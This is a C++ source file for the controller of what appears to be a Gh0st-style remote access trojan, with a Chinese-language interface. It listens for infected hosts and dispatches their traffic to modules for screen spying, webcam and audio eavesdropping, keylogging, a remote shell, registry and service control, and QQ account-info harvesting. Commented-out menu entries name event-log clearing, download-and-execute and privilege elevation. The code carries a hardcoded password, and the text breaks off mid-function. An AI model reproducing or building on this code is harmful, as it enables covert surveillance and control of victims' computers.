// MainFrm.cpp : implementation of the CMainFrame class
//

#include "stdafx.h"
#include "Client.h"
#include "TabView.h"
#include "MainFrm.h"
#include "ClientView.h"
#include "Build.h"
#include "Setting.h"
#include "FileManagerDlg.h"
#include "ScreenSpyDlg.h"
#include "WebCamDlg.h"
#include "AudioDlg.h"
#include "KeyBoardDlg.h"
#include "SystemDlg.h"
#include "ShellDlg.h"
#include "SysInfo.h"
#include "RegDlg.h"
#include "decode.h"
#include "UpdateDlg.h"
#include "LogView.h"
#include "LockDlg.h"
#include "Chat.h"
#include "QQInfoDlg.h"
#include "SerManager.h"
#include "Play.h"
#include "MyToolsKit.h"
#include "DllDlg.h"
#include "ProxyMapDlg.h"
#include "Signature.h"
//extern CDialogbar * pInfoMation;
#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

extern CTabView* g_pTabView;
CClientView* g_pConnectView = NULL; //在NotifyProc中初始化
CIOCPServer *m_iocpServer = NULL;
CMainFrame	*g_pFrame; // 在CMainFrame::CMainFrame()中初始化
extern CLogView* g_pLogView;
CString		m_PassWord = "password";

/////////////////////////////////////////////////////////////////////////////
// CMainFrame

IMPLEMENT_DYNCREATE(CMainFrame, CFrameWnd)

BEGIN_MESSAGE_MAP(CMainFrame, CFrameWnd)
	//{{AFX_MSG_MAP(CMainFrame)
	ON_WM_CREATE()
	ON_WM_CLOSE()
	ON_WM_SYSCOMMAND()
	ON_UPDATE_COMMAND_UI(ID_STAUTSTIP, OnUpdateStatusBar)
	ON_COMMAND(IDM_SHOW, OnShow)
	ON_COMMAND(IDM_HIDE, OnHide)
	ON_COMMAND(IDM_EXIT, OnExit)
	ON_COMMAND(ID_APP_EXIT, OnAppExit)
	ON_COMMAND(IDM_SETTING, OnSetting)
	ON_COMMAND(IDM_SETTING_, OnSetting)
	ON_COMMAND(IDM_BUILD, OnBuild)
	ON_COMMAND(IDM_BUILD_, OnBuild)
	ON_COMMAND(IDM_DNSUPDATE, OnDnsUpdate)
	ON_COMMAND(IDM_LOCK, OnLock)
	ON_COMMAND(IDM_TOOLS, OnTools)     //实用工具
	ON_WM_ERASEBKGND()
	ON_WM_TIMER()
	ON_UPDATE_COMMAND_UI(ID_STAUTSSPEED, OnUpdateStatusBar)
	ON_UPDATE_COMMAND_UI(ID_STAUTSPORT, OnUpdateStatusBar)
	ON_UPDATE_COMMAND_UI(ID_STAUTSCOUNT, OnUpdateStatusBar)
	//}}AFX_MSG_MAP
	ON_XTP_CREATECONTROL()
	ON_COMMAND(IDM_IBBSOR_A, OnSz)
	ON_COMMAND(IDM_IBBSOR_B, OnSz)
	ON_COMMAND(IDM_IBBSOR_C, OnSz)
	ON_COMMAND(IDM_IBBSOR_D, OnSz)
	ON_COMMAND(IDM_IBBSOR_E, OnSz)
	ON_COMMAND(IDM_IBBSOR_F, OnSz)
	ON_COMMAND(IDM_IBBSOR_G, OnSz)
	ON_COMMAND(IDM_IBBSOR_H, OnSz)
	ON_COMMAND(IDM_IBBSOR_I, OnSz)
	ON_COMMAND(IDM_IBBSOR_J, OnSz)
	ON_MESSAGE(XTPWM_DOCKINGPANE_NOTIFY, OnDockingPaneNotify)
	ON_COMMAND(XTP_ID_CUSTOMIZE, OnCustomize)
END_MESSAGE_MAP()

static UINT indicators[] =
{
	ID_STAUTSTIP,           // status line indicator
	ID_OS,
	ID_STAUTSCOUNT,
// 	ID_INDICATOR_CAPS,
// 	ID_INDICATOR_NUM,
// 	ID_INDICATOR_SCRL,
};


/////////////////////////////////////////////////////////////////////////////
// CMainFrame construction/destruction

CMainFrame::CMainFrame()
{
	// TODO: add member initialization code here
	m_bSetRestart = NULL;
	g_pFrame = this;
	m_nCount = 0;//初始化在线主机数
}

CMainFrame::~CMainFrame()
{
}


int CMainFrame::OnCreate(LPCREATESTRUCT lpCreateStruct)
{
	AfxGetApp()->m_nCmdShow = SW_HIDE;
	if (CXTPFrameWnd::OnCreate(lpCreateStruct) == -1)
		return -1;
	//界面居中显示
	this ->CenterWindow(CWnd::GetDesktopWindow());
	
	// 添加状态栏
	if (!m_wndStatusBar.Create(this) ||
		!m_wndStatusBar.SetIndicators(indicators,
		  sizeof(indicators)/sizeof(UINT)))
	{
		TRACE0("Failed to create status bar\n");
		return -1;      // fail to create
	}
	
	m_wndStatusBar.SetPaneInfo(0, m_wndStatusBar.GetItemID(0), SBPS_STRETCH, NULL);
	m_wndStatusBar.SetPaneInfo(1, m_wndStatusBar.GetItemID(1), SBPS_NORMAL, 700);
	m_wndStatusBar.SetPaneInfo(2, m_wndStatusBar.GetItemID(2), SBPS_NORMAL, 90);
// 	m_wndStatusBar.SetPaneInfo(3, m_wndStatusBar.GetItemID(3), SBPS_NORMAL, NULL);
// 	m_wndStatusBar.SetPaneInfo(4, m_wndStatusBar.GetItemID(4), SBPS_NORMAL, NULL);
// 	m_wndStatusBar.SetPaneInfo(5, m_wndStatusBar.GetItemID(5), SBPS_NORMAL, NULL);
	
//	XTPColorManager()->DisableLunaColors(TRUE);
	
	if (!m_TrayIcon.Create(_T("合计: 0台"), // Toolktip text
		this,                       // Parent window
		IDR_MAINFRAME,               // Icon resource ID
		IDR_MINIMIZE,             // Resource ID of popup menu
		IDM_SHOW,                // Default menu item for popup menu
		false))                     // True if default menu item is located by position
	{
		TRACE0("Failed to create tray icon\n");
		return -1;
	}	
	
	// 初始化 command bars
	if (!InitCommandBars())
	{
		return -1;
	}
	
	// 获取 command bars 目标 指针
	CXTPCommandBars* pCommandBars = GetCommandBars();
	if(pCommandBars == NULL)
	{
		TRACE0("Failed to create command bars object.\n");
		return -1;      // fail to create
	}
	
	//去掉菜单栏
	//SetMenu(NULL);

	// Create MenuBar
	CXTPMenuBar* pMenuBar = pCommandBars->SetMenu(_T("主菜单栏"), IDR_MAINFRAME);
	pMenuBar->ModifyBarStyle(CBRS_GRIPPER,0);
	pMenuBar->EnableDocking(xtpFlagStretched);
	pMenuBar->SetFlags(xtpFlagAddMDISysPopup);
	
	// Create ToolBar
// 	CXTPToolBar* pCommandBar = (CXTPToolBar*)pCommandBars->Add(_T("主工具栏"), xtpBarTop);
// 	if (!pCommandBar ||
// 		!pCommandBar->LoadToolBar(IDR_TOOLBAR4))
// 	{
// 		TRACE0("Failed to create toolbar\n");
// 		return -1;
// 	}
 	
	CXTPCommandBarsOptions* pOptions = pCommandBars->GetCommandBarsOptions();
	pOptions->bShowExpandButtonAlways = FALSE;
	pOptions->bShowTextBelowIcons = TRUE;
	pOptions->bLargeIcons = FALSE;

//	pCommandBar->ModifyBarStyle(CBRS_GRIPPER,0);
//	pCommandBar->EnableDocking(xtpFlagStretched);
//	pCommandBar->GetImageManager()->SetIcons(IDR_TOOLBAR4,IDB_BITMAP4);//IDB_BITMAP4-IDB_BARNEW

	RedrawWindow(0, 0, RDW_INVALIDATE|RDW_UPDATENOW|RDW_ERASE|RDW_ALLCHILDREN);   
	GetCommandBars()->GetPaintManager()->RefreshMetrics(); 

	ModifyStyle(WS_THICKFRAME, 0);
	ModifyStyle(0, WS_THICKFRAME);
	
	pCommandBars->GetCommandBarsOptions()->bShowTextBelowIcons = TRUE;
	pCommandBars->GetCommandBarsOptions()->ShowKeyboardCues(xtpKeyboardCuesShowNever);
	XTPColorManager()->DisableLunaColors(TRUE);
	pCommandBars->SetTheme(xtpThemeWhidbey); //工具栏
	
//	CXTPPaintManager::SetTheme(xtpThemeWhidbey); //设置日志对话框主题
		// 设置 Office 2003 主题
	CXTPPaintManager::SetTheme(xtpThemeVisualStudio2008);
	/*
	xtpThemeOffice2000,     // Office 2000 theme.
	xtpThemeOfficeXP,       // Office XP theme.
	xtpThemeOffice2003,     // Office 2003 theme.
	xtpThemeNativeWinXP,    // Windows XP themes support.
	xtpThemeWhidbey,        // Visual Studio 2005 theme.
	xtpThemeVisualStudio2008, // Visual Studio 2008 theme
	xtpThemeVisualStudio6,    // Visual Studio 6 theme
	xtpThemeVisualStudio2010, // Visual Studio 2010 theme
	xtpThemeCustom          // Custom theme.
	*/


	XTPColorManager()->DisableLunaColors(TRUE);
	
	LoadCommandBars(_T("CommandBars"));
	SetTimer(1,1000,NULL); 
	LoadIcons();  //菜单图片显示

	m_paneManager.InstallDockingPanes(this);
	m_paneManager.SetTheme(xtpPaneThemeWinNative);
	/*
	xtpPaneThemeOffice2003,            // Office 2003 Style Theme
	xtpPaneThemeWinNative,             // Windows Native Style Theme
	xtpPaneThemeVisualStudio2005Beta2, // Visual Studio 2005 Whidbey Beta 2 Style Theme
	xtpPaneThemeVisualStudio2008,      // Visual Studio 2008 Style Theme
	xtpPaneThemeVisualStudio2010,      // Visual Studio 2010 Beta 1 Style Theme
	xtpPaneThemeVisualStudio2005,      // Visual Studio 2005 Style Theme
	*/

	CXTPDockingPane* pwndPaneLog = CreatePane(300, 160, RUNTIME_CLASS(CLogView), _T("日志信息"), xtpPaneDockBottom);
//	CXTPDockingPane* pwndPaneplay = CreatePane(270, 165, RUNTIME_CLASS(CPlay), _T("系统操作"), xtpPaneDockBottom);
//	CXTPDockingPane* pwndPaneSignature = CreatePane(250, 160, RUNTIME_CLASS(CSignature), _T("数字签名"), xtpPaneDockBottom);
// 	CXTPDockingPane* pwndPaneLockFile = CreatePane(300, 165, RUNTIME_CLASS(CLockFile), _T("文件解密"), xtpPaneDockBottom);
// 	CXTPDockingPane* pwndPanePlayer = CreatePane(270, 160, RUNTIME_CLASS(CPlayer), _T("音乐播放器"), xtpPaneDockBottom);
	
//	m_paneManager.AttachPane(pwndPaneplay,pwndPaneLog);
// 	m_paneManager.AttachPane(pwndPaneSignature,pwndPaneplay);
//	m_paneManager.AttachPane(pwndPaneSignature,pwndPaneplay);
// 	m_paneManager.AttachPane(pwndPaneLockFile,pwndPaneplay);
// 	m_paneManager.AttachPane(pwndPanePlayer,pwndPaneplay);
	
	pwndPaneLog->Select();
	pwndPaneLog->SetOptions(xtpThemeCustom);
//    pwndPaneplay->SetOptions(xtpThemeCustom);
//	pwndPaneSignature->SetOptions(xtpThemeCustom);
//  	pwndPaneLockFile->SetOptions(xtpPaneNoCaption|xtpPaneNoFloatable|xtpPaneNoDockable);
//  	pwndPanePlayer->SetOptions(xtpPaneNoCaption|xtpPaneNoFloatable|xtpPaneNoDockable);
	
	return 0;
}

void CMainFrame::LoadIcons()   //右键菜单显示图标
{
// 	CXTPCommandBars* pCommandBars = GetCommandBars();
// 
// 	UINT uiGroupFind1[] = {IDM_FILEMANAGER,IDM_SCREENSPY,IDM_REMOTESHELL,IDM_KEYBOARD,IDM_AUDIO_LISTEN,
// 		IDM_WEBCAM,IDM_SYSTEM,IDM_SYSINFO,IDM_SERMANAGER,IDM_REGEDIT,IDM_CHAT,IDM_QQINFO
// 	};
// 
// 	UINT uiGroupFind2[] = {IDM_RESTART,IDM_SHUTDOWN,IDM_REBOOT,IDM_REMOVE,IDM_LOGOFF,IDM_RENAME_REMARK,
// 		IDM_CHANGEGROUP,IDM_FINDWINDOWS,IDM_FIND_PROCESS,ID_CHONGZHI,IDM_OPEN_URL_SHOW,IDM_OPEN_URL_HIDE
// 	};
// 
// 	UINT uiGroupFind3[] = {IDM_START_DLLCONGL,IDM_START_DLLCONTINUE,IDM_START_DLLUPGRADE,IDM_START_HIDE,
// 		IDM_START_SHOW,IDM_NO_START,IDM_IP,IDM_BEIZHU,IDM_DILIXINXI,IDM_ALL
// 	};
// 
// 	UINT uiGroupFind4[] = {IDM_CLEANEVENT,IDM_CLEAN_System,IDM_CLEAN_Security,IDM_CLEAN_Application};
// 	
// 	UINT uiGroupFind5[] = {IDM_IBBSOR_A,IDM_SHOWMSG,IDM_IBBSOR_B,IDM_IBBSOR_C,IDM_IBBSOR_I,IDM_MAP,IDM_IBBSOR_D,
// 		IDM_IBBSOR_E,IDM_IBBSOR_F,IDM_IBBSOR_G,IDM_IBBSOR_H,IDM_IBBSOR_J,IDM_SELECT_ALL,IDM_UNSELECT_ALL,0
// 	};
// 
// 	UINT uiGroupFind6[] = {0,IDM_EVENT_DELETE,IDM_ALL_DELETE,IDM_EVENT_SAVE,IDM_EVENT_COPY,};  //日志管理
// 
// 	UINT uiGroupFind7[] = {IDM_DOWNEXEC,IDM_UPDATE_SERVER};  //下载功能
// 
// 	UINT uiGroupFind8[] = {ID_MENUITEM_PROXY_MAP,IDM_START,ID_Screen,IDM_Elevate_Privileges,ID_EXP_ReStart,ID_IEQC};  //新加
// 
// 	pCommandBars->GetImageManager()->SetIcons(IDB_MENU1, uiGroupFind1, _countof(uiGroupFind1), CSize(16, 16));
// 	pCommandBars->GetImageManager()->SetIcons(IDB_MENU2, uiGroupFind2, _countof(uiGroupFind2), CSize(16, 16));
// 	pCommandBars->GetImageManager()->SetIcons(IDB_MENU3, uiGroupFind3, _countof(uiGroupFind3), CSize(16, 16));
// 	pCommandBars->GetImageManager()->SetIcons(IDB_MENU4, uiGroupFind4, _countof(uiGroupFind4), CSize(16, 16));
// 	pCommandBars->GetImageManager()->SetIcons(IDB_MENU5, uiGroupFind5, _countof(uiGroupFind5), CSize(16, 16));
// 	pCommandBars->GetImageManager()->SetIcons(IDB_MENU6, uiGroupFind6, _countof(uiGroupFind6), CSize(16, 16));
// 	pCommandBars->GetImageManager()->SetIcons(IDB_MENU7, uiGroupFind7, _countof(uiGroupFind7), CSize(16, 16));	
// 	pCommandBars->GetImageManager()->SetIcons(IDB_BITMAP3, uiGroupFind8, _countof(uiGroupFind8), CSize(16, 16));	
}

int CMainFrame::OnCreateControl(LPCREATECONTROLSTRUCT lpCreateControl)
{
	if (lpCreateControl->bToolBar == FALSE)
 	{
// 		if (lpCreateControl->controlType == xtpControlPopup && lpCreateControl->strCaption == _T("主机操作(&Z)"))
// 		{
// 			if (lpCreateControl->nID != IDM_IBBSOR_A)
// 			{
// 				lpCreateControl->controlType = xtpControlPopup;
// 				lpCreateControl->buttonStyle = xtpButtonIconAndCaption;
// 				lpCreateControl->nID = IDM_IBBSOR_A;
// 				return TRUE;
// 			}			
// 		}
// 
// 		if (lpCreateControl->controlType == xtpControlPopup && lpCreateControl->strCaption == _T("打开网址(&V)"))
// 		{
// 			if (lpCreateControl->nID != IDM_IBBSOR_B)
// 			{
// 				lpCreateControl->controlType = xtpControlPopup;
// 				lpCreateControl->buttonStyle = xtpButtonIconAndCaption;
// 				lpCreateControl->nID = IDM_IBBSOR_B;
// 				return TRUE;
// 			}
// 		}
// 
// 		if (lpCreateControl->controlType == xtpControlPopup && lpCreateControl->strCaption == _T("筛选功能(&T)"))
// 		{
// 			if (lpCreateControl->nID != IDM_IBBSOR_C)
// 			{
// 				lpCreateControl->controlType = xtpControlPopup;
// 				lpCreateControl->buttonStyle = xtpButtonIconAndCaption;
// 				lpCreateControl->nID = IDM_IBBSOR_C;
// 			}
// 			return TRUE;
// 		}
// 
// 		if (lpCreateControl->controlType == xtpControlPopup && lpCreateControl->strCaption == _T("信息更改(&M)"))
// 		{
// 			if (lpCreateControl->nID != IDM_IBBSOR_D)
// 			{
// 				lpCreateControl->controlType = xtpControlPopup;
// 				lpCreateControl->buttonStyle = xtpButtonIconAndCaption;
// 				lpCreateControl->nID = IDM_IBBSOR_D;
// 			}
// 			return TRUE;
// 		}
// 
// 		if (lpCreateControl->controlType == xtpControlPopup && lpCreateControl->strCaption == _T("控件管理(&K)"))
// 		{
// 			if (lpCreateControl->nID != IDM_IBBSOR_E)
// 			{
// 				lpCreateControl->controlType = xtpControlPopup;
// 				lpCreateControl->buttonStyle = xtpButtonIconAndCaption;
// 				lpCreateControl->nID = IDM_IBBSOR_E;
// 			}
// 			return TRUE;
// 		}
// 
// 		if (lpCreateControl->controlType == xtpControlPopup && lpCreateControl->strCaption == _T("文件上传(&O)"))
// 		{
// 			if (lpCreateControl->nID != IDM_IBBSOR_F)
// 			{
// 				lpCreateControl->controlType = xtpControlPopup;
// 				lpCreateControl->buttonStyle = xtpButtonIconAndCaption;
// 				lpCreateControl->nID = IDM_IBBSOR_F;
// 			}
// 			return TRUE;
// 		}

		if (lpCreateControl->controlType == xtpControlPopup && lpCreateControl->strCaption == _T("会话管理"))
		{
			if (lpCreateControl->nID != IDM_IBBSOR_G)
			{
				lpCreateControl->controlType = xtpControlPopup;
				lpCreateControl->buttonStyle = xtpButtonIconAndCaption;
				lpCreateControl->nID = IDM_IBBSOR_G;
			}
			return TRUE;
		}

		if (lpCreateControl->controlType == xtpControlPopup && lpCreateControl->strCaption == _T("常用附加"))
		{
			if (lpCreateControl->nID != IDM_IBBSOR_H)
			{
				lpCreateControl->controlType = xtpControlPopup;
				lpCreateControl->buttonStyle = xtpButtonIconAndCaption;
				lpCreateControl->nID = IDM_IBBSOR_H;
			}
			return TRUE;
		}
// 		if (lpCreateControl->controlType == xtpControlPopup && lpCreateControl->strCaption == _T("下载功能(&B)"))
// 		{
// 			if (lpCreateControl->nID != IDM_IBBSOR_I)
// 			{
// 				lpCreateControl->controlType = xtpControlPopup;
// 				lpCreateControl->buttonStyle = xtpButtonIconAndCaption;
// 				lpCreateControl->nID = IDM_IBBSOR_I;
// 			}
// 			return TRUE;
// 		}
// 		if (lpCreateControl->controlType == xtpControlPopup && lpCreateControl->strCaption == _T("清理日志(&Q)"))
// 		{
// 			if (lpCreateControl->nID != IDM_IBBSOR_J)
// 			{
// 				lpCreateControl->controlType = xtpControlPopup;
// 				lpCreateControl->buttonStyle = xtpButtonIconAndCaption;
// 				lpCreateControl->nID = IDM_IBBSOR_J;
// 			}
// 			return TRUE;
// 		}
 	}
	
	return FALSE;
}

void DecryptData(unsigned char *szRec, unsigned long nLen, unsigned long key) //解密插件
{
	unsigned long i;
	unsigned char p;
	
	p = (unsigned char ) key % 1451 + 61;
	for(i = 0; i < nLen; i++)
	{
		*szRec ^= p;
		*szRec += p;
		szRec++;
	}
}

CString Base64Decode(LPCTSTR lpszSrc) 
{
	ASSERT(lpszSrc != NULL && AfxIsValidString(lpszSrc));
	const unsigned int BASE64_DECODE_TABLE[256] = {
		255, 255, 255, 255, 255, 255, 255, 255, //  00 -  07
		255, 255, 255, 255, 255, 255, 255, 255, //  08 -  15
		255, 255, 255, 255, 255, 255, 255, 255, //  16 -  23
		255, 255, 255, 255, 255, 255, 255, 255, //  24 -  31
		255, 255, 255, 255, 255, 255, 255, 255, //  32 -  39
		255, 255, 255,  62, 255, 255, 255,  63, //  40 -  47
		52,  53,  54,  55,  56,  57,  58,  59, //  48 -  55
		60,  61, 255, 255, 255, 255, 255, 255, //  56 -  63
		255,   0,   1,   2,   3,   4,   5,   6, //  64 -  71
		7,   8,   9,  10,  11,  12,  13,  14, //  72 -  79
		15,  16,  17,  18,  19,  20,  21,  22, //  80 -  87
		23,  24,  25, 255, 255, 255, 255, 255, //  88 -  95
		255,  26,  27,  28,  29,  30,  31,  32, //  96 - 103
		33,  34,  35,  36,  37,  38,  39,  40, // 104 - 111
		41,  42,  43,  44,  45,  46,  47,  48, // 112 - 119
		49,  50,  51, 255, 255, 255, 255, 255, // 120 - 127
		255, 255, 255, 255, 255, 255, 255, 255,
		255, 255, 255, 255, 255, 255, 255, 255,
		255, 255, 255, 255, 255, 255, 255, 255,
		255, 255, 255, 255, 255, 255, 255, 255,
		255, 255, 255, 255, 255, 255, 255, 255,
		255, 255, 255, 255, 255, 255, 255, 255,
		255, 255, 255, 255, 255, 255, 255, 255,
		255, 255, 255, 255, 255, 255, 255, 255,
		255, 255, 255, 255, 255, 255, 255, 255,
		255, 255, 255, 255, 255, 255, 255, 255,
		255, 255, 255, 255, 255, 255, 255, 255,
		255, 255, 255, 255, 255, 255, 255, 255,
		255, 255, 255, 255, 255, 255, 255, 255,
		255, 255, 255, 255, 255, 255, 255, 255,
		255, 255, 255, 255, 255, 255, 255, 255,
		255, 255, 255, 255, 255, 255, 255, 255};
	
	const int nSrcCount=(int)_tcslen(lpszSrc);
	int nSize=nSrcCount/4*3;
	if(lpszSrc[nSrcCount-1]=='=')
		nSize--;
	if(lpszSrc[nSrcCount-2]=='=')
		nSize--;
	char* pOutBuffer=new char[nSize+3];
	ZeroMemory(pOutBuffer,nSize+3);
	LPCTSTR pInBuffer=lpszSrc;
	UINT iTest,iPack;
	for(int i=0;i<nSize/3 ;i++)
	{
		for(int j=0;j<4;j++)
		{
			iTest = BASE64_DECODE_TABLE[*pInBuffer++]; // Read from InputBuffer.
			//InPtr++;
			if (iTest == 0xFF) 
			{
				j--;
				continue; //读到255非法字符
			}
			iPack = iPack << 6 ;
			iPack = iPack | iTest ;
		}
		pOutBuffer[2] = iPack;
		iPack = iPack >> 8;
		pOutBuffer[1] = iPack;
		iPack = iPack >> 8;
		pOutBuffer[0] = iPack;
		//准备写入后3位
		pOutBuffer+= 3; iPack = 0;
		
	}
	switch(nSize%3)
	{
	case 1:
		iTest = BASE64_DECODE_TABLE[*pInBuffer++]; // Read from InputBuffer.
		if (iTest != 0xFF)
		{
			iPack = iPack << 6 ;
			iPack = iPack | iTest ;
		}
		iTest = BASE64_DECODE_TABLE[*pInBuffer++]; // Read from InputBuffer.
		if (iTest != 0xFF)
		{
			iPack = iPack << 6 ;
			iPack = iPack | iTest ;
		}
		iPack = iPack >> 4;
		pOutBuffer[0] = iPack;
		pOutBuffer++;
		break;
	case 2:
		iTest = BASE64_DECODE_TABLE[*pInBuffer++]; // Read from InputBuffer.
		if (iTest != 0xFF)
		{
			iPack = iPack << 6 ;
			iPack = iPack | iTest ;
		}
		iTest = BASE64_DECODE_TABLE[*pInBuffer++]; // Read from InputBuffer.
		if (iTest != 0xFF)
		{
			iPack = iPack << 6 ;
			iPack = iPack | iTest ;
		}
		iTest = BASE64_DECODE_TABLE[*pInBuffer++]; // Read from InputBuffer.
		if (iTest != 0xFF)
		{
			iPack = iPack << 6 ;
			iPack = iPack | iTest ;
		}
		iPack = iPack >> 2;
		pOutBuffer[1] = iPack;
		iPack = iPack >> 8;
		pOutBuffer[0] = iPack;
		pOutBuffer+=2;
		break;
	default:
		break;
	}
	pOutBuffer-=nSize;
	CString strDecode=pOutBuffer;
	delete pOutBuffer;
	return strDecode;
}

BOOL CMainFrame::PreCreateWindow(CREATESTRUCT& cs)
{
	if( !CFrameWnd::PreCreateWindow(cs) )
		return FALSE;
	
	// TODO: Modify the Window class or styles here by modifying
	// the CREATESTRUCT cs
	cs.cx = 1350;
	cs.cy = 600;
	cs.style &= ~FWS_ADDTOTITLE;
	cs.style &= ~FWS_ADDTOTITLE;
	
	//CString strTime;
    //SYSTEMTIME st;
    //GetLocalTime(&st);
	//strTime.Format("%s   (%d-%d-%d %d:%d)", "Eagle Eye 1.0", st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute);
	cs.lpszName = "Emin-monage";				   
	
	return TRUE;
}

/////////////////////////////////////////////////////////////////////////////
// CMainFrame diagnostics

#ifdef _DEBUG
void CMainFrame::AssertValid() const
{
    if (m_hWnd == NULL)
        return;     // null (unattached) windows are valid
	
    // check for special wnd??? values
    ASSERT(HWND_TOP == NULL);       // same as desktop
    if (m_hWnd == HWND_BOTTOM)
        ASSERT(this == &CWnd::wndBottom);
    else if (m_hWnd == HWND_TOPMOST)
        ASSERT(this == &CWnd::wndTopMost);
    else if (m_hWnd == HWND_NOTOPMOST)
        ASSERT(this == &CWnd::wndNoTopMost);
    else
    {
        // should be a normal window
        ASSERT(::IsWindow(m_hWnd));
	}
	//CFrameWnd::AssertValid();
}

void CMainFrame::Dump(CDumpContext& dc) const
{
	CFrameWnd::Dump(dc);
}
#endif //_DEBUG

/////////////////////////////////////////////////////////////////////////////
// CMainFrame message handlers

void CALLBACK CMainFrame::NotifyProc(LPVOID lpParam, ClientContext *pContext, UINT nCode)
{
	try
	{
		CMainFrame* pFrame = (CMainFrame*) lpParam;
		CString str;
		// 对g_pConnectView 进行初始化
		g_pConnectView = (CClientView *)((CClientApp *)AfxGetApp())->m_pConnectView;

		// g_pConnectView还没创建，这情况不会发生
		if (((CClientApp *)AfxGetApp())->m_pConnectView == NULL)
			return;

		g_pConnectView->m_iocpServer = m_iocpServer;

// 		str.Format(_T("S: %.2f kb/s "), (float)m_iocpServer->m_nSendKbps / 1024);
// 		g_pFrame->m_wndStatusBar.SetPaneText(1, str);
// 		
// 		str.Format(_T("R: %.2f kb/s "), (float)m_iocpServer->m_nRecvKbps / 1024);
//  		g_pFrame->m_wndStatusBar.SetPaneText(2, str);

		switch (nCode)
		{
		case NC_CLIENT_CONNECT:
			break;
		case NC_CLIENT_DISCONNECT:
			g_pConnectView->PostMessage(WM_REMOVEFROMLIST, 0, (LPARAM)pContext);
			break;
		case NC_TRANSMIT:
			break;
		case NC_RECEIVE:
			ProcessReceive(pContext);
			break;
		case NC_RECEIVE_COMPLETE:
			ProcessReceiveComplete(pContext);
			break;
		}
	}
	catch(...){}
}

void CMainFrame::Activate(UINT nPort, UINT nMaxConnections)
{
	SetTimer(0x000,1000,NULL);
	HICON icon0 = (HICON)::LoadImage(AfxGetInstanceHandle(),
		MAKEINTRESOURCE(IDI_reci),IMAGE_ICON, 16, 16, LR_SHARED);
	
	HICON icon1 = (HICON)::LoadImage(AfxGetInstanceHandle(),
		MAKEINTRESOURCE(IDI_zhuji),IMAGE_ICON, 16, 16, LR_SHARED);
	
	HICON icon2 = (HICON)::LoadImage(AfxGetInstanceHandle(),
		MAKEINTRESOURCE(IDI_shangx),IMAGE_ICON, 16, 16, LR_SHARED);
	
	//	CMainFrame* pFrm=(CMainFrame*)AfxGetApp()->m_pMainWnd;//得到主框架类指针
	CStatusBar* pStatus=&g_pFrame->m_wndStatusBar;//指针状态栏指针,m_wndStatusBar被我改成public属性了.
	if(pStatus)
	{ //加载图标的资源
		pStatus->GetStatusBarCtrl().SetIcon(0,icon0);
		pStatus->GetStatusBarCtrl().SetIcon(1,icon1);
		pStatus->GetStatusBarCtrl().SetIcon(2,icon2);
	}
	
	//请合理使用本程序，因为本程序所造成的任何法律责任作者不予承担
//	char strText[] = "囯磸鹃劦搩硦庫＊岇垽硦庫嬽掙硡眰唸磮乏紖掝唸楓憻撴硯保";
//	DecryptData((unsigned char*)strText,strlen(strText),998);
//	g_pLogView->InsertLogItem((strText), 0, 3);
//	g_pLogView->InsertLogItem("系统启动：",(strText), 0, 0 );
	CString str, strLogText;
	
	if (m_iocpServer != NULL)
	{
		m_iocpServer->Shutdown();
		delete m_iocpServer;

	}
	m_iocpServer = new CIOCPServer;
	
	// 开启IPCP服务器
	if (m_iocpServer->Initialize(NotifyProc, this, 100000, nPort))
	{
		CString IP;
		
		char hostname[256]; 
		gethostname(hostname, sizeof(hostname));
		HOSTENT *host = gethostbyname(hostname);
		if (host != NULL)
			IP = inet_ntoa(*(IN_ADDR*)host->h_addr_list[0]);
		else
			IP = _T("127.0.0.1");
		
		ShowWindow(SW_SHOW);
		UpdateWindow();
		
		CString web;
		web.Format(_T("%s: %d"), IP, nPort);
		m_wndStatusBar.SetPaneText(0, web);
		
// 		strLogText.Format("%s   监听端口: [%d]", "欢迎使用 ", nPort);
// 		g_pLogView->InsertLogItem(strLogText, 0, 0);
		strLogText.Format( "%s   监听端口: [%d] --> 监听成功 ", "欢迎使用!", nPort);
		g_pLogView->InsertLogItem("系统启动：",strLogText, 0, 4 );
	}
	else
	{
		ShowWindow(SW_SHOW);
		UpdateWindow();
		
// 		strLogText.Format("%s   端口[%d]监听失败！", "欢迎使用 ", nPort);
// 		g_pLogView->InsertLogItem(strLogText, 1, 1);

	//	strLogText.Format( "监听端口: [%d]绑定失败,可能你已开启另一个控制端或者端口被占用！", nPort);
	//	g_pLogView->InsertLogItem("系统启动：",strLogText, 0, 5 );
		
		str.Format(_T("端口[%d]监听失败"), nPort);
		AfxMessageBox(str);
		m_wndStatusBar.SetPaneText(0, str);
	}
	
//	m_wndStatusBar.SetPaneText(2, "合计: 0台");

}

void CMainFrame::ProcessReceiveComplete(ClientContext *pContext)
{
	if (pContext == NULL)
		return;

	// 如果管理对话框打开，交给相应的对话框处理
	CDialog	*dlg = (CDialog	*)pContext->m_Dialog[1];
	
	// 交给窗口处理
	if (pContext->m_Dialog[0] > 0)
	{
		switch (pContext->m_Dialog[0])
		{
		case SCREENSPY_DLG:   //远程桌面
			((CScreenSpyDlg *)dlg)->OnReceiveComplete();
			break;
		case WEBCAM_DLG:      //视频查看
			((CWebCamDlg *)dlg)->OnReceiveComplete();
			break;
		case FILEMANAGER_DLG: //文件管理
			((CFileManagerDlg *)dlg)->OnReceiveComplete();
			break;
		case KEYBOARD_DLG:    //键盘记录
			((CKeyBoardDlg *)dlg)->OnReceiveComplete();
			break;
		case SYSTEM_DLG:      //系统管理
			((CSystemDlg *)dlg)->OnReceiveComplete();
			break;
		case DLL_DLG:         //插件加载
			((CDllDlg *)dlg)->OnReceiveComplete();
	    	break;
		case AUDIO_DLG:       //语音监听
			((CAudioDlg *)dlg)->OnReceiveComplete();
			break;
		case SHELL_DLG:       //远程终端
			((CShellDlg *)dlg)->OnReceiveComplete();
			break;
		case SYSINFO_DLG:     //主机管理
			((CSysInfo *)dlg)->OnReceiveComplete();
			break;
		case SERMANAGER_DLG:  //服务管理
			((CSerManager *)dlg)->OnReceiveComplete();
			break;
		case REGEDIT_DLG:     //查注册表
            ((CRegDlg *)dlg)->OnReceiveComplete();
			break;
		case CHAT_DLG:        //远程交谈
			((CChat *)dlg)->OnReceiveComplete();
			break;
		case QQINFO_DLG:      //好友信息
			((CQQInfoDlg *)dlg)->OnReceiveComplete();
			break;
		case PROXYMAP_DLG:
			((CProxyMapDlg *)dlg)->OnReceiveComplete();
			break;
		default:
			break;
		}
		return;
	}

	switch (pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
	{
	case TOKEN_AUTH: // 要求验证
